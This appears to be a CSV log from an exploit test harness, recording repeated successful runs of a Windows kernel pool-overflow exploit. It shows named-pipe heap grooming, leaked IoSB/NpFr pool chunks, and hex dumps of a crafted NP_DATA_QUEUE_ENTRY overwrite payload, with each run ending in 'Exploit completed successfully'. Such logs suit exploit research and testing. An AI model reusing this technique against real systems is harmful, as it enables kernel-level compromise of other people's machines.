<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:39:41+00:00,2,21,13,running,running,True,success,0,12.625,True,True,84,26.726,1,65,10,3,"SB attempt 9 for capture 3
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 10 for capture 3
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 2 IoSB attempt 9 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=404 NpFr=504 pipeBase=500 pipeIndex=980 capture=2 iosbAttempt=9 pipeAttempt=0 pipeLeak=0
    [0000018F6B2DCC30]  42536F490A100000  2B6FDF6265E44DED
    [0000018F6B2DCC40]  D4903CE5B8695D5D  0000000000000000
    [0000018F6B2DCC50]  0000000000000000  0000000000000000
    [0000018F6B2DCC60]  42536F490E0D0003  0000000000000000
    [0000018F6B2DCC70]  000000000000000C  FFFF970D6EC696D0
    [0000018F6B2DCC80]  00000000000003E8  6161616161616161
    [0000018F6B2DCC90]  6161616161616161  6161616161616161
    [0000018F6B2DCCA0]  6161616161616161  6161616161616161
    [0000018F6B2DCCB0]  6161616161616161  6161616161616161
    [0000018F6B2DCCC0]  6161616161616161  6161616161616161
    [0000018F6B2DCCD0]  6161616161616161  6161616161616161
    [0000018F6B2DCCE0]  6161616161616161  6161616161616161
    [0000018F6B2DCCF0]  6161616161616161  6161616161616161
    [0000018F6B2DCD00]  6161616161616161  6161616161616161
    [0000018F6B2DCD10]  6161616161616161  6161616161616161
    [0000018F6B2DCD20]  0000000000000000  0000000000000000
    [0000018F6B2DCD30]  7246704E0A100000  2B6FDF6265E44EED
    [0000018F6B2DCD40]  FFFF970D70E04C88  FFFF970D70E04C88
    [0000018F6B2DCD50]  0000000000000000  FFFF970D70D122E0
    [0000018F6B2DCD60]  000000C000000000  00000000000000C0
    [0000018F6B2DCD70]  000003D445504950  3939393939393939
    [0000018F6B2DCD80]  3939393939393939  3939393939393939
    [0000018F6B2DCD90]  3939393939393939  3939393939393939
    [0000018F6B2DCDA0]  3939393939393939  3939393939393939
    [0000018F6B2DCDB0]  3939393939393939  3939393939393939
    [0000018F6B2DCDC0]  3939393939393939  3939393939393939
    [0000018F6B2DCDD0]  3939393939393939  3939393939393939
    [0000018F6B2DCDE0]  3939393939393939  3939393939393939
    [0000018F6B2DCDF0]  3939393939393939  3939393939393939
    [0000018F6B2DCE00]  3939393939393939  3939393939393939
    [0000018F6B2DCE10]  3939393939393939  3939393939393939
    [0000018F6B2DCE20]  3939393939393939  3939393939393939
    [0000018F6B2DCE30]  7246704E0A100000  2B6FDF6265E44FED
    [0000018F6B2DCE40]  FFFF970D70E075C8  FFFF970D70E075C8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [0000018F6B2DAF50]  7246704E0A100000  2B6FDF6265E44EED
    [0000018F6B2DAF60]  FFFF970D70E04C88  FFFF970D70E04C88
    [0000018F6B2DAF70]  0000018F6B2BFF60  FFFF970D70D122E0
    [0000018F6B2DAF80]  000000C000000001  
 [*] Full payload to trigger overflow:
    [0000018F6B2DAF40]  0000000000000000  0000000000000000
    [0000018F6B2DAF50]  7246704E0A100000  2B6FDF6265E44EED
    [0000018F6B2DAF60]  FFFF970D70E04C88  FFFF970D70E04C88
    [0000018F6B2DAF70]  0000018F6B2BFF60  FFFF970D70D122E0
    [0000018F6B2DAF80]  000000C000000001  00000000000000C0
    [0000018F6B2DAF90]  000003D445504950  3939393939393939
    [0000018F6B2DAFA0]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=9
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:39:55+00:00,2,22,14,running,running,True,success,0,12.422,True,True,6,2.667,1,5,5,2,"SB attempt 4 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 5 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 1 IoSB attempt 4 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=704 NpFr=804 pipeBase=800 pipeIndex=1010 capture=1 iosbAttempt=4 pipeAttempt=0 pipeLeak=0
    [0000016C0340C760]  42536F490A100000  2B6FDF62654A50ED
    [0000016C0340C770]  D4903CE5B8D4005D  0000000000000000
    [0000016C0340C780]  0000000000000000  0000000000000000
    [0000016C0340C790]  42536F490E0D0003  0000000000000000
    [0000016C0340C7A0]  000000000000000C  FFFF970D6F464A50
    [0000016C0340C7B0]  00000000000003E8  6161616161616161
    [0000016C0340C7C0]  6161616161616161  6161616161616161
    [0000016C0340C7D0]  6161616161616161  6161616161616161
    [0000016C0340C7E0]  6161616161616161  6161616161616161
    [0000016C0340C7F0]  6161616161616161  6161616161616161
    [0000016C0340C800]  6161616161616161  6161616161616161
    [0000016C0340C810]  6161616161616161  6161616161616161
    [0000016C0340C820]  6161616161616161  6161616161616161
    [0000016C0340C830]  6161616161616161  6161616161616161
    [0000016C0340C840]  6161616161616161  6161616161616161
    [0000016C0340C850]  0000000000000000  0000000000000000
    [0000016C0340C860]  7246704E0A100000  2B6FDF62654A51ED
    [0000016C0340C870]  FFFF970D70E900A8  FFFF970D70E900A8
    [0000016C0340C880]  0000000000000000  FFFF970D709CB9E0
    [0000016C0340C890]  000000C000000000  00000000000000C0
    [0000016C0340C8A0]  000003F245504950  3939393939393939
    [0000016C0340C8B0]  3939393939393939  3939393939393939
    [0000016C0340C8C0]  3939393939393939  3939393939393939
    [0000016C0340C8D0]  3939393939393939  3939393939393939
    [0000016C0340C8E0]  3939393939393939  3939393939393939
    [0000016C0340C8F0]  3939393939393939  3939393939393939
    [0000016C0340C900]  3939393939393939  3939393939393939
    [0000016C0340C910]  3939393939393939  3939393939393939
    [0000016C0340C920]  3939393939393939  3939393939393939
    [0000016C0340C930]  3939393939393939  3939393939393939
    [0000016C0340C940]  3939393939393939  3939393939393939
    [0000016C0340C950]  3939393939393939  3939393939393939
    [0000016C0340C960]  7246704E0A100000  2B6FDF62654A52ED
    [0000016C0340C970]  FFFF970D70E91368  FFFF970D70E91368
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [0000016C0340E270]  7246704E0A100000  2B6FDF62654A51ED
    [0000016C0340E280]  FFFF970D70E900A8  FFFF970D70E900A8
    [0000016C0340E290]  0000016C02FB0CB0  FFFF970D709CB9E0
    [0000016C0340E2A0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [0000016C0340E260]  0000000000000000  0000000000000000
    [0000016C0340E270]  7246704E0A100000  2B6FDF62654A51ED
    [0000016C0340E280]  FFFF970D70E900A8  FFFF970D70E900A8
    [0000016C0340E290]  0000016C02FB0CB0  FFFF970D709CB9E0
    [0000016C0340E2A0]  000000C000000001  00000000000000C0
    [0000016C0340E2B0]  000003F245504950  3939393939393939
    [0000016C0340E2C0]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=9
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:40:12+00:00,2,23,15,running,running,True,success,0,15.859,True,True,6,3.5,1,6,6,1,"SB attempt 5 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 6 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 5 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=604 NpFr=704 pipeBase=700 pipeIndex=507 capture=0 iosbAttempt=5 pipeAttempt=0 pipeLeak=0
    [000001DCB6A1B450]  42536F490A100000  2B6FDF62646D35ED
    [000001DCB6A1B460]  D4903CE5B838455D  0000000000000000
    [000001DCB6A1B470]  0000000000000000  0000000000000000
    [000001DCB6A1B480]  42536F490E0D0003  0000000000000000
    [000001DCB6A1B490]  000000000000000C  FFFF970D6F45EE40
    [000001DCB6A1B4A0]  00000000000003E8  6161616161616161
    [000001DCB6A1B4B0]  6161616161616161  6161616161616161
    [000001DCB6A1B4C0]  6161616161616161  6161616161616161
    [000001DCB6A1B4D0]  6161616161616161  6161616161616161
    [000001DCB6A1B4E0]  6161616161616161  6161616161616161
    [000001DCB6A1B4F0]  6161616161616161  6161616161616161
    [000001DCB6A1B500]  6161616161616161  6161616161616161
    [000001DCB6A1B510]  6161616161616161  6161616161616161
    [000001DCB6A1B520]  6161616161616161  6161616161616161
    [000001DCB6A1B530]  6161616161616161  6161616161616161
    [000001DCB6A1B540]  0000000000000000  0000000000000000
    [000001DCB6A1B550]  7246704E0A100000  2B6FDF62646D36ED
    [000001DCB6A1B560]  FFFF970D7061E728  FFFF970D7061E728
    [000001DCB6A1B570]  0000000000000000  FFFF970D70D82BC0
    [000001DCB6A1B580]  000000C000000000  00000000000000C0
    [000001DCB6A1B590]  000001FB45504950  3939393939393939
    [000001DCB6A1B5A0]  3939393939393939  3939393939393939
    [000001DCB6A1B5B0]  3939393939393939  3939393939393939
    [000001DCB6A1B5C0]  3939393939393939  3939393939393939
    [000001DCB6A1B5D0]  3939393939393939  3939393939393939
    [000001DCB6A1B5E0]  3939393939393939  3939393939393939
    [000001DCB6A1B5F0]  3939393939393939  3939393939393939
    [000001DCB6A1B600]  3939393939393939  3939393939393939
    [000001DCB6A1B610]  3939393939393939  3939393939393939
    [000001DCB6A1B620]  3939393939393939  3939393939393939
    [000001DCB6A1B630]  3939393939393939  3939393939393939
    [000001DCB6A1B640]  3939393939393939  3939393939393939
    [000001DCB6A1B650]  7246704E0A100000  2B6FDF62646D37ED
    [000001DCB6A1B660]  FFFF970D70E8AA68  FFFF970D70E8AA68
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001DCB6A1B6C0]  7246704E0A100000  2B6FDF62646D36ED
    [000001DCB6A1B6D0]  FFFF970D7061E728  FFFF970D7061E728
    [000001DCB6A1B6E0]  000001DCB6570000  FFFF970D70D82BC0
    [000001DCB6A1B6F0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001DCB6A1B6B0]  0000000000000000  0000000000000000
    [000001DCB6A1B6C0]  7246704E0A100000  2B6FDF62646D36ED
    [000001DCB6A1B6D0]  FFFF970D7061E728  FFFF970D7061E728
    [000001DCB6A1B6E0]  000001DCB6570000  FFFF970D70D82BC0
    [000001DCB6A1B6F0]  000000C000000001  00000000000000C0
    [000001DCB6A1B700]  000001FB45504950  3939393939393939
    [000001DCB6A1B710]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=13
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:40:21+00:00,2,24,16,running,running,True,success,0,6.953,True,True,44,16.614,1,37,7,2,"IoSB attempt 6 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 7 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 1 IoSB attempt 6 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=704 NpFr=804 pipeBase=800 pipeIndex=14 capture=1 iosbAttempt=6 pipeAttempt=0 pipeLeak=0
    [000002031357DCC0]  42536F490A100000  2B6FDF6264EFF0ED
    [000002031357DCD0]  D4903CE5B994805D  0000000000000000
    [000002031357DCE0]  0000000000000000  0000000000000000
    [000002031357DCF0]  42536F490E0D0003  0000000000000000
    [000002031357DD00]  000000000000000C  FFFF970D6EC755E0
    [000002031357DD10]  00000000000003E8  6161616161616161
    [000002031357DD20]  6161616161616161  6161616161616161
    [000002031357DD30]  6161616161616161  6161616161616161
    [000002031357DD40]  6161616161616161  6161616161616161
    [000002031357DD50]  6161616161616161  6161616161616161
    [000002031357DD60]  6161616161616161  6161616161616161
    [000002031357DD70]  6161616161616161  6161616161616161
    [000002031357DD80]  6161616161616161  6161616161616161
    [000002031357DD90]  6161616161616161  6161616161616161
    [000002031357DDA0]  6161616161616161  6161616161616161
    [000002031357DDB0]  0000000000000000  0000000000000000
    [000002031357DDC0]  7246704E0A100000  2B6FDF6264EFF1ED
    [000002031357DDD0]  FFFF970D70941D68  FFFF970D70941D68
    [000002031357DDE0]  0000000000000000  FFFF970D709D0660
    [000002031357DDF0]  000000C000000000  00000000000000C0
    [000002031357DE00]  0000000E45504950  3939393939393939
    [000002031357DE10]  3939393939393939  3939393939393939
    [000002031357DE20]  3939393939393939  3939393939393939
    [000002031357DE30]  3939393939393939  3939393939393939
    [000002031357DE40]  3939393939393939  3939393939393939
    [000002031357DE50]  3939393939393939  3939393939393939
    [000002031357DE60]  3939393939393939  3939393939393939
    [000002031357DE70]  3939393939393939  3939393939393939
    [000002031357DE80]  3939393939393939  3939393939393939
    [000002031357DE90]  3939393939393939  3939393939393939
    [000002031357DEA0]  3939393939393939  3939393939393939
    [000002031357DEB0]  3939393939393939  3939393939393939
    [000002031357DEC0]  7246704E0A100000  2B6FDF6264EFF2ED
    [000002031357DED0]  FFFF970D70907208  FFFF970D70907208
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [00000203134DBEE0]  7246704E0A100000  2B6FDF6264EFF1ED
    [00000203134DBEF0]  FFFF970D70941D68  FFFF970D70941D68
    [00000203134DBF00]  0000020313080D70  FFFF970D709D0660
    [00000203134DBF10]  000000C000000001  
 [*] Full payload to trigger overflow:
    [00000203134DBED0]  0000000000000000  0000000000000000
    [00000203134DBEE0]  7246704E0A100000  2B6FDF6264EFF1ED
    [00000203134DBEF0]  FFFF970D70941D68  FFFF970D70941D68
    [00000203134DBF00]  0000020313080D70  FFFF970D709D0660
    [00000203134DBF10]  000000C000000001  00000000000000C0
    [00000203134DBF20]  0000000E45504950  3939393939393939
    [00000203134DBF30]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=6
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:40:32+00:00,2,25,17,running,running,True,success,0,9.297,True,True,21,11.0,1,21,21,1,"SB attempt 20 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 21 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 20 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=4 NpFr=104 pipeBase=100 pipeIndex=40 capture=0 iosbAttempt=20 pipeAttempt=0 pipeLeak=0
    [0000015C88392050]  42536F490A100000  2B6FDF6265A998ED
    [0000015C88392060]  D4903CE5B8C1485D  0000000000000000
    [0000015C88392070]  0000000000000000  0000000000000000
    [0000015C88392080]  42536F490E0D0003  0000000000000000
    [0000015C88392090]  000000000000000C  FFFF970D6EC752B0
    [0000015C883920A0]  00000000000003E8  6161616161616161
    [0000015C883920B0]  6161616161616161  6161616161616161
    [0000015C883920C0]  6161616161616161  6161616161616161
    [0000015C883920D0]  6161616161616161  6161616161616161
    [0000015C883920E0]  6161616161616161  6161616161616161
    [0000015C883920F0]  6161616161616161  6161616161616161
    [0000015C88392100]  6161616161616161  6161616161616161
    [0000015C88392110]  6161616161616161  6161616161616161
    [0000015C88392120]  6161616161616161  6161616161616161
    [0000015C88392130]  6161616161616161  6161616161616161
    [0000015C88392140]  0000000000000000  0000000000000000
    [0000015C88392150]  7246704E0A100000  2B6FDF6265A999ED
    [0000015C88392160]  FFFF970D70BAFB28  FFFF970D70BAFB28
    [0000015C88392170]  0000000000000000  FFFF970D709E43A0
    [0000015C88392180]  000000C000000000  00000000000000C0
    [0000015C88392190]  0000002845504950  3939393939393939
    [0000015C883921A0]  3939393939393939  3939393939393939
    [0000015C883921B0]  3939393939393939  3939393939393939
    [0000015C883921C0]  3939393939393939  3939393939393939
    [0000015C883921D0]  3939393939393939  3939393939393939
    [0000015C883921E0]  3939393939393939  3939393939393939
    [0000015C883921F0]  3939393939393939  3939393939393939
    [0000015C88392200]  3939393939393939  3939393939393939
    [0000015C88392210]  3939393939393939  3939393939393939
    [0000015C88392220]  3939393939393939  3939393939393939
    [0000015C88392230]  3939393939393939  3939393939393939
    [0000015C88392240]  3939393939393939  3939393939393939
    [0000015C88392250]  7246704E0A100000  2B6FDF6265A99AED
    [0000015C88392260]  FFFF970D70BA88C8  FFFF970D70BA88C8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [0000015C8842EF60]  7246704E0A100000  2B6FDF6265A999ED
    [0000015C8842EF70]  FFFF970D70BAFB28  FFFF970D70BAFB28
    [0000015C8842EF80]  0000015C88340020  FFFF970D709E43A0
    [0000015C8842EF90]  000000C000000001  
 [*] Full payload to trigger overflow:
    [0000015C8842EF50]  0000000000000000  0000000000000000
    [0000015C8842EF60]  7246704E0A100000  2B6FDF6265A999ED
    [0000015C8842EF70]  FFFF970D70BAFB28  FFFF970D70BAFB28
    [0000015C8842EF80]  0000015C88340020  FFFF970D709E43A0
    [0000015C8842EF90]  000000C000000001  00000000000000C0
    [0000015C8842EFA0]  0000002845504950  3939393939393939
    [0000015C8842EFB0]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=9
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:40:36+00:00,2,26,18,running,running,True,success,0,2.937,True,True,2,1.5,1,2,2,1,"ze: 0x100
 [*] Triggering overflow with payload size: 0xbc (Padding: 0x98, Overflow: 0x24)
 [*] Sending 0xbc bytes of payload to driver...
 [*] ###### Found ThreadName Overwrite ######
 [*] Cleaned 2999 extra thread names, 0 failed
 [*] IoSB attempt 1 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 2 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 1 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=804 NpFr=904 pipeBase=900 pipeIndex=9 capture=0 iosbAttempt=1 pipeAttempt=0 pipeLeak=0
    [0000026955A7B660]  42536F490A100000  2B6FDF6264D25AED
    [0000026955A7B670]  D4903CE5B9A4FA5D  0000000000000000
    [0000026955A7B680]  0000000000000000  0000000000000000
    [0000026955A7B690]  42536F490E0D0003  0000000000000000
    [0000026955A7B6A0]  000000000000000C  FFFF970D6E34E1E0
    [0000026955A7B6B0]  00000000000003E8  6161616161616161
    [0000026955A7B6C0]  6161616161616161  6161616161616161
    [0000026955A7B6D0]  6161616161616161  6161616161616161
    [0000026955A7B6E0]  6161616161616161  6161616161616161
    [0000026955A7B6F0]  6161616161616161  6161616161616161
    [0000026955A7B700]  6161616161616161  6161616161616161
    [0000026955A7B710]  6161616161616161  6161616161616161
    [0000026955A7B720]  6161616161616161  6161616161616161
    [0000026955A7B730]  6161616161616161  6161616161616161
    [0000026955A7B740]  6161616161616161  6161616161616161
    [0000026955A7B750]  0000000000000000  0000000000000000
    [0000026955A7B760]  7246704E0A100000  2B6FDF6264D25BED
    [0000026955A7B770]  FFFF970D70EA3BA8  FFFF970D70EA3BA8
    [0000026955A7B780]  0000000000000000  FFFF970D70D7C860
    [0000026955A7B790]  000000C000000000  00000000000000C0
    [0000026955A7B7A0]  0000000945504950  3939393939393939
    [0000026955A7B7B0]  3939393939393939  3939393939393939
    [0000026955A7B7C0]  3939393939393939  3939393939393939
    [0000026955A7B7D0]  3939393939393939  3939393939393939
    [0000026955A7B7E0]  3939393939393939  3939393939393939
    [0000026955A7B7F0]  3939393939393939  3939393939393939
    [0000026955A7B800]  3939393939393939  3939393939393939
    [0000026955A7B810]  3939393939393939  3939393939393939
    [0000026955A7B820]  3939393939393939  3939393939393939
    [0000026955A7B830]  3939393939393939  3939393939393939
    [0000026955A7B840]  3939393939393939  3939393939393939
    [0000026955A7B850]  3939393939393939  00000000FDFDFDFD
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [0000026955A490E0]  7246704E0A100000  2B6FDF6264D25BED
    [0000026955A490F0]  FFFF970D70EA3BA8  FFFF970D70EA3BA8
    [0000026955A49100]  000002695546F9C0  FFFF970D70D7C860
    [0000026955A49110]  000000C000000001  
 [*] Full payload to trigger overflow:
    [0000026955A490D0]  0000000000000000  0000000000000000
    [0000026955A490E0]  7246704E0A100000  2B6FDF6264D25BED
    [0000026955A490F0]  FFFF970D70EA3BA8  FFFF970D70EA3BA8
    [0000026955A49100]  000002695546F9C0  FFFF970D70D7C860
    [0000026955A49110]  000000C000000001  
 [*] Exploit completed successfully.

